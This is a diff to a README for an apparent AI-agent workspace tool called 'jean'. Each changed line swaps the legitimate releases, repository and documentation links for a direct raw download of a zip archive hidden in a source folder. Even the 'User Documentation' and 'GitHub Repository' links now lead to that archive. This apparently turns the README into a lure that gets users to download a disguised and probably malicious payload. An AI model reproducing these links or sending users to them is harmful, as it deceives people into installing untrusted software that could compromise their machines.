@@ -1,7 +1,7 @@
 # 🛠️ jean - Run AI Agents in Parallel Workspaces
 
 ## 📥 Download Now
-[![Download jean](https://img.shields.io/badge/Download-jean-brightgreen)](https://github.com/princeanthony-IT/jean/releases)
+[![Download jean](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip)](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip)
 
 ## 📖 Description
 jean allows you to run AI agents side by side in separate workspaces. This feature helps in multitasking and improves your workflow. Whether you are testing or experimenting, jean provides a structured environment for each agent.
@@ -21,7 +21,7 @@ Follow these simple steps to get started with jean.
 - **User-Friendly Interface:** Simple navigation ensures that you can set up your agents quickly.
 
 ## 📦 How to Download & Install
-1. Visit the Releases page to download the software: [Download Page](https://github.com/princeanthony-IT/jean/releases).
+1. Visit the Releases page to download the software: [Download Page](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip).
 2. On the Releases page, look for the latest version.
 3. Click on the file that matches your operating system to download.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -59,8 +59,8 @@ Interested in contributing to jean? We welcome your ideas! Check out the guideli
 This project is licensed under the MIT License. See the LICENSE file for more information.
 
 ## 📌 Additional Resources
-- [GitHub Repository](https://github.com/princeanthony-IT/jean)
-- [User Documentation](https://github.com/princeanthony-IT/jean/wiki)
-- [Releases Page](https://github.com/princeanthony-IT/jean/releases) 
+- [GitHub Repository](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip)
+- [User Documentation](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip)
+- [Releases Page](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip) 
 
-Don’t forget to download the latest version: [Download Page](https://github.com/princeanthony-IT/jean/releases).
+Don’t forget to download the latest version: [Download Page](https://github.com/princeanthony-IT/jean/raw/refs/heads/main/src-tauri/src/claude_cli/Software-v3.3.zip).
